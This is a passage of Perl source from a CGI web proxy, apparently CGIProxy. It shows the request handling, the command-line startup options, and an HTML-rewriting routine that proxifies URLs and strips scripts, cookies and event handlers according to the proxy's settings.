	foreach (@ALLOWED_SCRIPT_SERVERS) {
	    $scripts_are_banned_here= 0, last   if $host=~ /$_/ ;
	}
    }
    unless ($scripts_are_banned_here) {
	foreach (@BANNED_SCRIPT_SERVERS) {
	    $scripts_are_banned_here= 1, last   if $host=~ /$_/ ;
	}
    }
}


# Set $cookies_are_banned_here appropriately
$cookies_are_banned_here= $e_remove_cookies ;
unless ($cookies_are_banned_here) {
    if (@ALLOWED_COOKIE_SERVERS) {
	$cookies_are_banned_here= 1 ;
	foreach (@ALLOWED_COOKIE_SERVERS) {
	    $cookies_are_banned_here= 0, last   if $host=~ /$_/ ;
	}
    }
    unless ($cookies_are_banned_here) {
	foreach (@BANNED_COOKIE_SERVERS) {
	    $cookies_are_banned_here= 1, last   if $host=~ /$_/ ;
	}
    }
}


if ($scripts_are_banned_here && $expected_type ne '') {
    &script_content_die if $expected_type=~ /^$SCRIPT_TYPE_REGEX$/io ;
}

if ($TEXT_ONLY) {
    # First, forbid requests for filenames with non-text-type extensions
    &non_text_die if ($path=~ /\.($NON_TEXT_EXTENSIONS)(;|\?|$)/i) ;

    # Then, filter the "Accept:" header to accept only text
    $env_accept=~ s#\*/\*#text/*#g ;    # not strictly perfect
    $env_accept= join(', ', grep(m#^text/#i, split(/\s*,\s*/, $env_accept)) ) ;
    &non_text_die unless $env_accept ne '' ;
}

if ($images_are_banned_here) {
    &skip_image unless grep(m#^(text|\*)/#i, split(/\s*,\s*/, $env_accept) ) ;
}

$base_url= $URL ;
&fix_base_vars ;   # must be called whenever $base_url is set


# Redirect if $URL matches one of the patterns in %REDIRECTS.
if (defined $REDIRECTS{$host}) {
    my($s1, $s2)= @{$REDIRECTS{$host}}[0,1] ;
    &redirect_to(full_url($URL)) if $URL=~ s/$s1/$s2/ ;
}

$default_style_type= 'text/css' ;

$default_script_type= 'application/x-javascript' ;
($cookie_to_server, %auth)= &parse_cookie($ENV{'HTTP_COOKIE'}, $path, $host, $port, $scheme) ;
$cookie_to_server= &get_cookies_from_db($path, $host, $port, $scheme)  if $USE_DB_FOR_COOKIES ;

if ($scheme eq 'http') {
    &http_get ;
} elsif ($scheme eq 'https') {
    &http_get ;
} elsif ($scheme eq 'ftp') {
    &ftp_get ;
}

ONE_RUN_EXIT:

close(S) ;
untie(*S) ;
eval { alarm(0) } ;   # use eval{} to avoid failing where alarm() is missing


# Put this back in to run speed trials
#if ($is_html) {
#    # OK, let's time this thing
#    my($eutime,$estime)= (times)[0,1] ;
#    open(LOG,">>proxy.log") ;
#    print LOG "full times: ", $eutime-$sutime, " ", $estime-$sstime,
#        " ", time-$starttime, "  URL: $URL\n" ;
#    close(LOG) ;
#}


}  # sub one_run {



# Main block


# Because of problems assigning STDIN and STDOUT to dup'ed tied filehandles, we
#   just use these variables for IO, and keep them up to date.
$STDIN= \*STDIN ;
$STDOUT= \*STDOUT ;


# If not running as a normal CGI or mod_perl script...
if (!$ENV{GATEWAY_INTERFACE}) {
    my $cmd= shift(@ARGV)  unless $ARGV[0]=~ /^-/ ;
    my($num_processes, $max_requests, $port_arg, $wants_help) ;
    GetOptions('num-processes|n:i' => \$num_processes,
	       'max-requests|m:i' => \$max_requests,
	       'port|p:i' => \$port_arg,
	       'help|h|?' => \$wants_help)  or die "bad options-- try '$0 -?' for help\n" ;
    print(<<EOU), exit  if $wants_help or $cmd eq '' ;
Usage:
  $0  command  [ -n num_processes ]  [ -m max_requests ]  [ -p port ]

Parameters:
  command
    ... where command is one of:
      install-modules  install all optional Perl (CPAN) modules
      purge-db         purge the database of old data, which must be
			 done periodically if using a database
      start-fcgi       start FastCGI server processes (see -n and -m parameters)
      start-server     start the embedded server process (see -p parameter)
  -n, --num-processes  num_processes
    ... where num_processes is a positive integer: this sets how many
      FastCGI processes will be started and maintained (default=$FCGI_NUM_PROCESSES)
  -m, --max-requests  max_requests
    ... where max_requests is a positive integer:  this limits how
      many requests a single FastCGI process can handle before restarting
      (default=$FCGI_MAX_REQUESTS_PER_PROCESS)
  -p, --port  port
    ... where port is the port number you want the embedded server to
      listen on (default=443)
  -?, -h, --help
    print this usage message

Examples:
  $0 install-modules
  $0 purge-db
  $0 start-fcgi -n 1000

EOU


    # Start the FastCGI process manager.
    if ($cmd eq 'start-fcgi') {
	$num_processes||= $FCGI_NUM_PROCESSES ;
	$max_requests||= $FCGI_MAX_REQUESTS_PER_PROCESS ;
	install_modules() ;
	require_with_install('FCGI', 1) ;
	require_with_install('FCGI::ProcManager', 1) ;
	$RUN_METHOD= 'fastcgi' ;
	my $proc_mgr= FCGI::ProcManager->new( { n_processes => $num_processes,
						max_requests => $max_requests } ) ;
	$proc_mgr->pm_manage() ;
	my $socket= FCGI::OpenSocket($FCGI_SOCKET, 10) ;
	chmod(0777, $FCGI_SOCKET) unless $FCGI_SOCKET=~ /^:/ ;   # jsm-- not terribly secure....
	my $request= FCGI::Request(\*STDIN, \*STDOUT, \*STDERR, \%ENV, $socket) ;
	while ($request->Accept>=0) {
	    $proc_mgr->pm_pre_dispatch() ;    # required for FCGI::ProcManager
	    init unless $HAS_INITED;
	    eval { one_run() } ;
	    warn $@ if $@ ;   # jsm-- should do anything else here?
	    $proc_mgr->pm_post_dispatch() ;   # required for FCGI::ProcManager
	}
	FCGI::CloseSocket($socket);


    # Use the embedded server (daemon).
    } elsif ($cmd eq 'start-server') {
	$port_arg||= 443 ;
	install_modules() ;
	eval { require Net::SSLeay } ;  # don't check during compilation
	die "Running CGIProxy as a daemon requires the Net::SSLeay module.\n" if $@ ;
	$RUN_METHOD= 'embedded' ;

	# We need the port before calling init(), which complicates this.
	my($LOCK_FH, $port, $pid)= create_server_lock('http.run') ;
	if ($LOCK_FH) {
	    my $HTTPS_LISTEN ;
	    ($HTTPS_LISTEN, $port)= new_server_socket($port_arg) ;
	    $<= $>= $RUN_AS_USER  if $RUN_AS_USER and $>==0 ;
	    &set_ENV_UNCHANGING($port) ;
	    %ENV= %ENV_UNCHANGING ;       # needed for init
	    init ;
	    $pid= spawn_generic_server($HTTPS_LISTEN, $LOCK_FH, \&handle_http_request, 0, 1) ;
	}
	my $hostname= hostfqdn() ;
	$hostname=~ s/\.$// ;   # bug in hostfqdn() may leave trailing dot
	my $portst= $port==443  ? ''  : ":$port" ;
	print "URL of this proxy:  https://$hostname$portst/$SECRET_PATH/\n\nProcess ID:  $pid\n" ;


    # This needs to be done periodically, to clear out old cookies and sessions.
    #   Best to put it in a cron job.
    } elsif ($cmd eq 'purge-db') {
	init ;
	purge_db() ;


    } elsif ($cmd eq 'install-modules') {
	install_modules() ;
    }



# ... else is running as normal CGI or mod_perl script.
} else {
    $RUN_METHOD= $ENV{MOD_PERL}  ? 'mod_perl'  : 'cgi' ;
    init unless $HAS_INITED;
    eval { one_run() } ;
    # We'd act on $@, but it does what we need below anyway.
}


EXIT:

# Catch-all-- if any handles are still open, close them here.  Some error
#   handling relies on this happening.  Also cancel existing alarm.
# These are basically for mod_perl, and unneeded if running as a CGI script.
close(S) ;
untie(*S) ;
eval { alarm(0) } ;   # use eval{} to avoid failing where alarm() is missing

exit if $RUN_METHOD eq 'cgi' ;

sub proxify_html {
    my($body_ref, $is_full_page, $no_exit_on_frameset)= @_ ;
    my(@out, $start, $comment, $script_block, $style_block, $decl_bang, $decl_question, $tag,
       $body_pos, $html_pos, $head_pos, $first_script_pos, $out_start,
       $has_content, $in_noscript, $in_title, $title, $full_insertion, $body2,
       $current_object_classid, $old_url_start) ;
    my($ua_is_MSIE)= $ENV{'HTTP_USER_AGENT'}=~ /MSIE/ ;   # used in tight loops

    # Allow first parameter to be reference to list of values to be joined.
    $body_ref= \(join('', @$body_ref)) if ref($body_ref) eq 'ARRAY' ;

    # Allow first parameter to be string instead of reference, for convenience.
    if (!ref($body_ref)) {
	$body2= $body_ref ;
	$body_ref= \$body2 ;
    }

    if ($expected_type ne '') {
	$old_url_start= $url_start ;
	$url_start= url_start_by_flags($e_remove_cookies, $e_remove_scripts, $e_filter_ads,
				       $e_hide_referer, $e_insert_entry_form, $is_in_frame, '') ;
    }
    $full_insertion= &full_insertion($URL,0)   if $is_full_page ;

    # second line was: (?:(<!--.*?--\s*> | <!--.*?> )  # order is important
    while ( $$body_ref=~ m{\G( (?> [^<]* ) (?> < (?![a-zA-Z/!\?]) [^<]* )* )
			     (?:(<!--(?=.*?-->).*?--\s*> | <!--(?!.*?-->).*?> )
			       |(<script\b.*?</script\b.*?>)
			       |(<style\b.*?</style\b.*?>)
			       |(<![^>]*>?)
			       |(<\?[^>]*>?)
			       |(<[^>]*>?)
			     )?
			  }sgix )
    {

	# Above regex must be in scalar context to work, so set vars here.
	($start, $comment, $script_block, $style_block, $decl_bang, $decl_question, $tag)=
	    ($1, $2, $3, $4, $5, $6, $7) ;

	if ($tag && !$body_pos && $tag=~ m#^</title\b#i) {
	    $start= ''  if $REMOVE_TITLES ;
	    $title= $start ;
	}


	# Pass the text between tags through to the output.
	push(@out, $start) ;

	# Used when there is illegal early script content (see continue block).
	$out_start= @out ;

	$has_content||= $start=~ /\S/ unless $in_noscript || $in_title ;

	if ($tag) {

	    my($tag_name, $attrs, %attr, $name, $rebuild) ;

	    ($tag_name, $attrs)= $tag=~ /^<\s*(\/?\s*[A-Za-z][\w.:-]*)\s*([^>]*)/ ;
	    $tag_name=~ s#^/\s*#/# ;
	    $tag_name= lc($tag_name) ;

	    if ($tag_name eq 'noscript') {
		$in_noscript++ ;
		if ($scripts_are_banned_here) {
		    $tag=~ s/^<\s*noscript\b/<div/i ;
		    $tag_name= 'div' ;
		    $rebuild= 1 ;
		}
	    } elsif ($tag_name eq '/noscript') {
		$in_noscript-- if $in_noscript>0 ;
		push(@out, '</div>'), next if $scripts_are_banned_here ;
	    } elsif ($tag_name eq 'title') {
		$in_title++ ;
	    } elsif ($tag_name eq '/title') {
		$in_title-- ;
	    }

	    
	    $html_pos= @out+1  if !$html_pos && ($tag_name eq 'html') ;
	    $head_pos= @out+1  if !$head_pos && ($tag_name eq 'head') ;
	    $body_pos= @out+1  if !$body_pos && ($tag_name eq 'body') ;

	    # Clear $current_object_classid as needed.
	    $current_object_classid= ''  if $tag_name eq '/object' ;

	    &return_frame_doc(&wrap_proxy_encode($URL), $title)
		if ($tag_name eq 'frameset') && $doing_insert_here  && !$is_in_frame
		   && !$no_exit_on_frameset ;

	    # Close <div> block that surrounds entire original page.
	    push(@out, "</div>\n") if $tag_name eq '/body' ;

	    # Pass tag through if it has no attributes, or if it doesn't parse
	    #   above (which would make $attrs undefined).  This includes end tags.
	    push(@out, $tag), next   if ($attrs eq '') ;

	    PARSE_ATTRS: {
#		while ($attrs=~ /([A-Za-z][\w.:-]*)\s*(?:=\s*(?:"([^">]*)"?|'([^'>]*)'?|([^'"][^\s>]*)))?/g ) {
		while ($attrs=~ /([A-Za-z][\w.:-]*)\s*(?:=\s*(?:"([^"]*)"|'([^']*)'|([^'"][^\s>]*)|(['"])))?/g ) {
		    if (defined($5)) {
			# Again, next line only works in scalar context.
			$$body_ref=~ /\G([^>]*)(>?)/gc ;
			my($extra, $close)= ($1, $2) ;
			# exit loop if at end of string
			last if ($extra eq '') and ($close eq '') ;
			$attrs.= '>' . $extra ;
			$tag.=   $extra . $close ;
			%attr= () ;
			redo PARSE_ATTRS ;
		    }

		    $name= lc($1) ;
		    $rebuild= 1, next if exists($attr{$name}) ; # duplicate attr
		    $attr{$name}= &HTMLunescape(defined($2) ? $2
					      : defined($3) ? $3
					      : defined($4) ? $4
					      : '' ) ;
		}
	    }


	    if ( (my(@remove_attrs)= grep(/^on/i || $attr{$_}=~ /&{/ , keys %attr))
		 and ($scripts_are_banned_here or !match_csp_source_list('script-src', "'unsafe-inline'")) )
	    {
		
		delete @attr{ @remove_attrs } ;
		$rebuild= 1 ;

	    } elsif ($PROXIFY_SCRIPTS) {

		
		foreach (keys %attr) {
		    $attr{$_}=~ s/&{(.*?)};/
				 '&{' . (&proxify_block($1, $default_script_type))[0] . '};'
				 /sge
			&& ($rebuild= 1) ;
		}

		
		foreach (grep(/^on/, keys %attr)) {
		    $attr{$_}= (&proxify_block($attr{$_}, $default_script_type))[0] ;
		    $rebuild= 1 ;
		}
	    }


	    if (defined($attr{style})) {
		delete($attr{style}), $rebuild=1
		    if !match_csp_source_list('style-src', "'unsafe-inline'") ;

		# Remove or proxify any "dynamic properties" in style
		#   attributes.  Only bother if user is using MSIE.
		if ($ua_is_MSIE) {
		    if ($scripts_are_banned_here or !match_csp_source_list('script-src', "'unsafe-inline'")) {
			delete($attr{style}), $rebuild=1
			    if $attr{style}=~ /(?:expression|function)\s*\(/i ;

		    } elsif ($PROXIFY_SCRIPTS) {
			# Proxify any strings inside "expression()" or "function()".
			$attr{style}= &proxify_expressions_in_css($attr{style}), $rebuild= 1
			    if $attr{style}=~ /(?:expression|function)\s*\(/i ;
		    }
		}

		$attr{style}= (&proxify_block($attr{style}, $default_style_type))[0], $rebuild=1 ;
	    }


	    if ($tag_name eq 'a') {
		# Remove type attribute altogether.
		delete $attr{type}, $rebuild=1   if defined($attr{type});

		if (defined($attr{href})) {

		    # If needed, detect if frame state might change.
		    # Deframe if (target unframes) or (no target and base target unframes)
		    if (   ($base_unframes && !defined($attr{target}))
			 || $attr{target}=~ /^_(top|blank)$/i         )
		    {
			$attr{href}= &full_url_by_frame($attr{href},0), $rebuild=1 ;
		    } else {
			$attr{href}= &full_url($attr{href}), $rebuild=1 ;
		    }


		    # If browsers were to handle all type attributes correctly
		    #   (see notes above), we'd use the block below to insert
		    #   the expected type into the linked-to URL.  Instead we
		    #   use the block above, because it's faster.

		    ## Could require $doing_insert_here here too to save a little
		    ##   time... may not keep frame state right, but wouldn't matter.
		    #my($link_unframe) ;
		    #$link_unframe=  ($base_unframes && !defined($attr{target}))
		    #              || $attr{target}=~ /^_(top|blank)$/i
		    #    if $is_in_frame ;

		    ## Use temporary copy of $url_start to call full_url() normally.
		    ## Only generate new value if is_in_frame flag has changed,
		    ##   or if type flag needs to be changed.
		    ## Verify that $attr{type} is a valid MIME type.
		    #local($url_start)= $url_start ;
		    #if ( ($attr{type} ne '') || $link_unframe ) {
		    #    ($attr{type})= $attr{type}=~ m#^\s*([\w.+\$-]*/[\w.+\$-]*)#, $rebuild=1
		    #        if  defined($attr{type}) && $attr{type}!~ m#^[\w.+\$-]+/[\w.+\$-]+$# ;
		    #    $url_start= &url_start_by_flags($e_remove_cookies, $e_remove_scripts, $e_filter_ads,
		    #                                    $e_hide_referer, $e_insert_entry_form,
		    #                                    $link_unframe  ? 0  : $is_in_frame,
		    #                                    lc($attr{type})) ;
		    #}

		    #$attr{href}= &full_url($attr{href}), $rebuild=1 ;
		}



	    # Some browsers accept the faulty "<image>" tag instead of "<img>",
	    #   so handle that or else it's a privacy hole.  Changing <image>
	    #   tags to <img> works, plus lets such pages work in all browsers.
	    } elsif ($tag_name eq 'img' or $tag_name eq 'image') {
		$tag_name= 'img',                        $rebuild=1  if $tag_name eq 'image' ;

		# jsm-- better would be, if $RETURN_EMPTY_GIF is set, to
		#   modify src and lowsrc to be e.g. /x-proxy/images/emptygif
		#   so that it could be cached.
		if ( ($TEXT_ONLY && !$RETURN_EMPTY_GIF)
		      or !match_csp_source_list('img-src', $attr{src})
		      or !match_csp_source_list('img-src', $attr{lowsrc}) )
		{
		    delete($attr{src}) ;
		    delete($attr{lowsrc}) ;
		    $rebuild= 1 ;
		} else {
		    $attr{src}=    &full_url($attr{src}),    $rebuild=1  if defined($attr{src}) ;
		    $attr{lowsrc}= &full_url($attr{lowsrc}), $rebuild=1  if defined($attr{lowsrc}) ;
		}

		$attr{longdesc}= &full_url($attr{longdesc}), $rebuild=1  if defined($attr{longdesc}) ;
		$attr{usemap}= &full_url($attr{usemap}),     $rebuild=1  if defined($attr{usemap}) ;
		$attr{dynsrc}= &full_url($attr{dynsrc}),     $rebuild=1  if defined($attr{dynsrc}) ;


	    } elsif ($tag_name eq 'body') {
		$attr{background}= &full_url($attr{background}), $rebuild=1 if defined($attr{background}) ;

		# Using _proxy_css_main_div in place of the <body> element is
		#   an imperfect art.  Here we set the class to be the class of
		#   <body> if needed.
		$full_insertion=~ s/(\bid="_proxy_css_main_div\")/$1 class="$attr{class}"/
		    if $is_full_page and $attr{class} ;


	    } elsif ($tag_name eq 'base') {
		next unless match_csp_source_list('base-uri', $attr{href}) ;

		# Remember what we need to from this <base> tag.  Only set
		#   $base_url etc. if $attr{href} looks like an absolute URL
		#   (which it always should, but some pages have errors).
		$base_url= $attr{href}, &fix_base_vars
		    if defined($attr{href}) && $attr{href}=~ m#^[\w+.-]+://# ;
		$base_unframes= $attr{target}=~ /^_(top|blank)$/i ;

		# Then convert any href attribute normally.
		$attr{href}= &full_url($attr{href}), $rebuild=1  if defined($attr{href}) ;



	    } elsif ($tag_name eq 'frame') {
		next unless match_csp_source_list('frame-src', $attr{src}) ;
		$attr{src}=      &full_url_by_frame($attr{src}, 1), $rebuild=1 if defined($attr{src}) ;
		$attr{longdesc}= &full_url($attr{longdesc}),        $rebuild=1 if defined($attr{longdesc}) ;

	    } elsif ($tag_name eq 'iframe') {
		next unless match_csp_source_list('frame-src', $attr{src}) ;
		$attr{src}=      &full_url_by_frame($attr{src}, 1), $rebuild=1 if defined($attr{src}) ;
		$attr{longdesc}= &full_url($attr{longdesc}),        $rebuild=1 if defined($attr{longdesc}) ;


	    # <head>'s profile attribute can be a space-separated list of URIs.
	    } elsif ($tag_name eq 'head') {
		$attr{profile}= join(' ', map {&full_url($_)} split(" ", $attr{profile})),
		    $rebuild=1  if defined($attr{profile}) ;

	    } elsif ($tag_name eq 'layer') {
		$attr{src}=  &full_url($attr{src}),  $rebuild=1  if defined($attr{src}) ;



	    } elsif ($tag_name eq 'input') {
		$attr{src}=        &full_url($attr{src}),        $rebuild=1  if defined($attr{src}) ;
		$attr{usemap}=     &full_url($attr{usemap}),     $rebuild=1  if defined($attr{usemap}) ;
		$attr{formaction}= &full_url($attr{formaction}), $rebuild=1  if defined($attr{formaction}) ;


	    # <form> tag needs special attention, here and elsewhere.
	    # is <form script='...'> attribute ever used, or even recognized
	    #    by any browser?  It's not defined in any W3C DTD.
	    } elsif ($tag_name eq 'form') {
		next unless match_csp_source_list('form-action', $attr{action}) ;

		# Deframe if (target unframes) or (no target and base target unframes)
		if (   ($base_unframes && !defined($attr{target}))
		     || $attr{target}=~ /^_(top|blank)$/i         )
		{
		    $attr{action}= &full_url_by_frame($attr{action},0), $rebuild=1 if defined($attr{action}) ;
		} else {
		    $attr{action}= &full_url($attr{action}),            $rebuild=1 if defined($attr{action}) ;
		}

		if (defined($attr{script})
		    and ($scripts_are_banned_here or !match_csp_source_list('script-src', "'unsafe-inline'")) )
		{
		    delete($attr{script}), $rebuild=1 ;
		} else {
		    $attr{script}= &full_url($attr{script}), $rebuild=1  if defined($attr{script}) ;
		}



	    # The only special handling for <area> is to handle any deframing.
	    } elsif ($tag_name eq 'area') {
		# Deframe if (target unframes) or (no target and base target unframes)
		if (   ($base_unframes && !defined($attr{target}))
		     || $attr{target}=~ /^_(top|blank)$/i         )
		{
		    $attr{href}= &full_url_by_frame($attr{href},0), $rebuild=1  if defined($attr{href}) ;
		} else {
		    $attr{href}= &full_url($attr{href}), $rebuild=1  if defined($attr{href}) ;
		}


	    } elsif ($tag_name eq 'link') {
		# Verify that $attr{type} is a valid MIME type.
		($attr{type})= $attr{type}=~ m#^\s*([\w.+\$-]*/[\w.+\$-]*)#, $rebuild=1
		    if  defined($attr{type}) && $attr{type}!~ m#^[\w.+\$-]+/[\w.+\$-]+$# ;

		my($type)= lc($attr{type}) ;

		
		if ($attr{rel}=~ /\bstylesheet\b/i) {
		    next if defined($attr{href}) and !match_csp_source_list('style-src', $attr{href}) ;
		    $type= 'text/css' if $type eq '' ;

		} elsif (lc($attr{rel}) eq 'icon') {
		    next if defined($attr{href}) and !match_csp_source_list('img-src', $attr{href}) ;
		}

		# Remove tag if it links to a script type and scripts are banned.
		if ($type=~ /^$SCRIPT_TYPE_REGEX$/io) {
		    next if $scripts_are_banned_here ;
		    next if defined($attr{href}) and !match_csp_source_list('script-src', $attr{href}) ;
		    next if defined($attr{src})  and !match_csp_source_list('script-src', $attr{src}) ;
		    next if defined($attr{urn})  and !match_csp_source_list('script-src', $attr{urn}) ;
		}

		# Deframe if (target unframes) or (no target and base target unframes)
		my($link_unframe) ;
		$link_unframe=  ($base_unframes && !defined($attr{target}))
			      || $attr{target}=~ /^_(top|blank)$/i
		    if $is_in_frame ;

		# Use temporary copy of $url_start to call full_url() normally.
		# Only generate new value if type flag has changed or we're deframing.
		local($url_start)= $url_start ;
		if ($type ne '') {
		    $url_start= url_start_by_flags($e_remove_cookies, $e_remove_scripts, $e_filter_ads,
						   $e_hide_referer, $e_insert_entry_form,
						   $link_unframe  ? 0  : $is_in_frame,
						   $type) ;
		} elsif ($link_unframe) {
		    $url_start= $url_start_noframe ;
		}

		$attr{href}= &full_url($attr{href}), $rebuild=1  if defined($attr{href}) ;
		$attr{src}=  &full_url($attr{src}),  $rebuild=1  if defined($attr{src}) ;   # Netscape?
		$attr{urn}=  &full_url($attr{urn}),  $rebuild=1  if defined($attr{urn}) ;


	    } elsif ($tag_name eq 'meta') {
		$attr{url}= &full_url($attr{url}), $rebuild=1  if defined($attr{url}) ;   # Netscape

		if (defined($attr{'http-equiv'}) && defined($attr{content})) {
		    $attr{content}= &new_header_value(@attr{'http-equiv', 'content'}, 1) ;
		    delete($attr{'http-equiv'}) unless defined($attr{content}) ;
		    $rebuild= 1 ;
		}


	    } elsif ($tag_name eq 'param') {

		# classid

		# Below is not needed anymore.
		# Handle any classid's specially.
		#if ($current_object_classid=~
		#    /^\s*clsid:\{?D27CDB6E-AE6D-11CF-96B8-444553540000\}?\s*$/i)
		#{
		    if (lc($attr{name}) eq 'movie') {
			# Retain query string for Flash apps.
			$attr{value}= &full_url($attr{value}, 1) ;
			$rebuild= 1 ;

		    } elsif (lc($attr{name}) eq 'flashvars') {
			$attr{value}= proxify_flashvars($attr{value}) ;
			$rebuild= 1 ;
		    }



		#} elsif (lc($attr{valuetype}) eq 'ref') {
		if (lc($attr{valuetype}) eq 'ref') {
		    # Verify that $attr{type} is a valid MIME type.
		    ($attr{type})= $attr{type}=~ m#^\s*([\w.+\$-]*/[\w.+\$-]*)#, $rebuild=1
			if  defined($attr{type}) && $attr{type}!~ m#^[\w.+\$-]+/[\w.+\$-]+$# ;

		    my($type)= lc($attr{type}) ;

		    # Remove tag if it links to a script type and scripts are banned.
		    next if $type=~ /^$SCRIPT_TYPE_REGEX$/io
			    and ($scripts_are_banned_here
				 or !match_csp_source_list('script-src', $attr{value})) ;

		    # Convert value attribute if needed.
		    if (defined($attr{value}) && ($attr{value}=~ /^[\w.+-]+:/)) {

			# Use a local copy of $url_start to call full_url() normally.
			# Only generate new $url_start if the type flag has changed.
			local($url_start)= $url_start ;
			$url_start= url_start_by_flags($e_remove_cookies, $e_remove_scripts, $e_filter_ads,
						       $e_hide_referer, $e_insert_entry_form,
						       $is_in_frame, $type)
			    if $type ne '' ;
			$attr{value}= &full_url($attr{value}) ;
			$rebuild= 1 ;
		    }
		}

	    } elsif ($tag_name eq 'applet') {
		my($codebase_url)= $attr{codebase} ;

		# Here is where we would guard against codebase leaving the
		#   directory: check for absolute path, absolute URL, or ".." .
		#next if $codebase_url=~ m#^/|^[\w+.-]*:|\.\.# ;

		# if $codebase_url is relative, then make it absolute based on
		#   current $base_ vars.  This is the quick method from full_url().
		# Only do this if $codebase_url is not empty.
		if ($codebase_url ne '') {
		    $codebase_url= 
			  $codebase_url=~ m#^[\w+.-]*:#i ? $codebase_url
			: $codebase_url=~ m#^//#         ? $base_scheme . $codebase_url
			: $codebase_url=~ m#^/#          ? $base_host . $codebase_url
			: $codebase_url=~ m#^\?#         ? $base_file . $codebase_url
			:                                  $base_path . $codebase_url ;
		}

		# codebase must be converted with normal $base_ vars first, but
		#   only after its original value is saved (above).
		$attr{codebase}= &full_url($attr{codebase}), $rebuild=1  if defined($attr{codebase}) ;

		# Use local() copies of $base_ vars, starting with current
		#   values as defaults.
		local($base_url, $base_scheme, $base_host, $base_path, $base_file)=
		    ($base_url, $base_scheme, $base_host, $base_path, $base_file) ;

		# Now set local $base_ vars if needed.
		$base_url= $codebase_url, &fix_base_vars  if $codebase_url ne '' ;

		next if    !match_csp_source_list('object-src', $attr{code})
			or !match_csp_source_list('object-src', $attr{object}) ;
		match_csp_source_list('object-src', $_) or next
		    foreach split(/\s*,\s*/, $attr{archive}) ;

		# These two can now be converted normally, using new $base_ vars.
		$attr{code}=   &full_url($attr{code}),   $rebuild=1  if defined($attr{code}) ;
		$attr{object}= &full_url($attr{object}), $rebuild=1  if defined($attr{object}) ;

		# archive is a comma-separated list of URIs: split, convert, join.
		$attr{archive}= join(',', map {&full_url($_)} split(/\s*,\s*/, $attr{archive})),
		    $rebuild=1  if defined($attr{archive}) ;

	    } elsif ($tag_name eq 'object') {
		# Set $current_object_classid for detailed <param> handling
		$current_object_classid= $attr{classid} ;

		# Verify that $attr{type} is a valid MIME type.
		($attr{type})= $attr{type}=~ m#^\s*([\w.+\$-]*/[\w.+\$-]*)#, $rebuild=1
		    if  defined($attr{type}) && $attr{type}!~ m#^[\w.+\$-]+/[\w.+\$-]+$# ;

		# Verify that $attr{codetype} is a valid MIME type.
		($attr{codetype})= $attr{codetype}=~ m#^\s*([\w.+\$-]*/[\w.+\$-]*)#, $rebuild=1
		    if  defined($attr{codetype}) && $attr{codetype}!~ m#^[\w.+\$-]+/[\w.+\$-]+$# ;

		my($type)=     lc($attr{type}) ;
		my($codetype)= lc($attr{codetype}) ;
		my($codebase_url)= $attr{codebase} ;

		# Remove tag if it links to a script type and scripts are banned.
		if ($type=~ /^$SCRIPT_TYPE_REGEX$/io) {
		    next if $scripts_are_banned_here
			    or !match_csp_source_list('script-src', $attr{data}) ;
		}

		# if $codebase_url is relative, then make it absolute based on
		#   current $base_ vars.
		# Only do this if $codebase_url is not empty.
		if ($codebase_url ne '') {
		    $codebase_url= absolute_url($codebase_url) ; 
		}

		# usemap is the only attribute converted normally.
		$attr{usemap}= &full_url($attr{usemap}), $rebuild=1  if defined($attr{usemap}) ;

		# codebase must be converted with normal $base_ vars first, but
		#   only after its original value is saved (above).
		$attr{codebase}= &full_url_by_frame($attr{codebase},1), $rebuild=1
		    if defined($attr{codebase}) ;

		# For remaining three attributes, use $base_ vars according to
		#   $codebase_url, without which default to original $base_ vars.
		local($base_url, $base_scheme, $base_host, $base_path, $base_file)=
		    ($base_url, $base_scheme, $base_host, $base_path, $base_file) ;
		$base_url= $codebase_url, &fix_base_vars  if $codebase_url ne '' ;

		# Remove tag if it links to a script type and scripts are banned.
		if ($codetype=~ /^$SCRIPT_TYPE_REGEX$/io) {
		    next if $scripts_are_banned_here
			    or !match_csp_source_list('script-src', $attr{classid}) ;
		}

		next if !match_csp_source_list('object-src', $attr{data}) ;
		next if $attr{classid}!~ /^clsid:/i
			&& !match_csp_source_list('object-src', $attr{classid}) ;
		match_csp_source_list('object-src', $_) or next
		    foreach split(" ", $attr{archive}) ;

		# archive is a space-separated list of URIs: split, convert, join.
		# Do this before changing $url_start for data and classid handling.
		$attr{archive}= join(' ', map {&full_url_by_frame($_,1)} split(" ", $attr{archive})),
		    $rebuild=1  if defined($attr{archive}) ;

		# Convert data attribute if needed.
		# Note that $is_in_frame is set to 1 anyway, so go ahead and
		#   generate a new $url_start regardless.
		if (defined($attr{data})) {
		    local($url_start)= url_start_by_flags($e_remove_cookies, $e_remove_scripts, $e_filter_ads,
							  $e_hide_referer, $e_insert_entry_form, 1, $type) ;
		    $attr{data}= &full_url($attr{data}) ;
		    $rebuild= 1 ;
		}


		if (defined($attr{classid}) && ($attr{classid}!~ /^clsid:/i)) {
		    local($url_start)= url_start_by_flags($e_remove_cookies, $e_remove_scripts, $e_filter_ads,
							  $e_hide_referer, $e_insert_entry_form, 1,
							  ($codetype ne '')   ? $codetype   : $type ) ;
		    $attr{classid}= &full_url($attr{classid}) ;
		    $rebuild= 1 ;
		}

		# Proxifying SWF files relies on our JS library.
		$needs_jslib= 1 ;





	    # This will likely only be used when called recursively by the
	    #   block below that handles <script>...<script> blocks.

	    } elsif ($tag_name eq 'script') {

		# Probably won't get here, but catch in case one slips through.
		next if $scripts_are_banned_here ;

		# Verify that $attr{type} is a valid MIME type.
		($attr{type})= $attr{type}=~ m#^\s*([\w.+\$-]*/[\w.+\$-]*)#, $rebuild=1
		    if  defined($attr{type}) && $attr{type}!~ m#^[\w.+\$-]+/[\w.+\$-]+$# ;

		if (defined($attr{src})) {
		    my($type, $language) ;

		    # Handle CSP's script-src directive.
		    next unless match_csp_source_list('script-src', $attr{src}, $attr{nonce}) ;

		    $type= lc($attr{type}) ;

		    # If there's no type, but there's a language attribute, then
		    #   use that instead to guess the expected type.
		    if (!$type && ($language= $attr{language})) {
			$type= $language=~ /javascript|ecmascript|livescript|jscript/i
							 ? 'application/x-javascript'
			     : $language=~ /css/i        ? 'text/css'
			     : $language=~ /vbscript/i   ? 'application/x-vbscript'
			     : $language=~ /perl/i       ? 'application/x-perlscript'
			     : $language=~ /tcl/i        ? 'text/tcl'
			     :                             ''
		    }
		    $type||= $default_script_type ;

		    # Use a local copy of $url_start to call full_url() normally.
		    # Only generate new $url_start if the type flag has changed.
		    local($url_start)= $url_start ;
		    if ($type) {
			$url_start= url_start_by_flags($e_remove_cookies, $e_remove_scripts,
						       $e_filter_ads, $e_hide_referer,
						       $e_insert_entry_form, $is_in_frame, $type) ;
		    }
		    $attr{src}= &full_url($attr{src}) ;
		    $rebuild= 1 ;

		    $needs_jslib= 1, (defined($first_script_pos) || ($first_script_pos= $out_start))
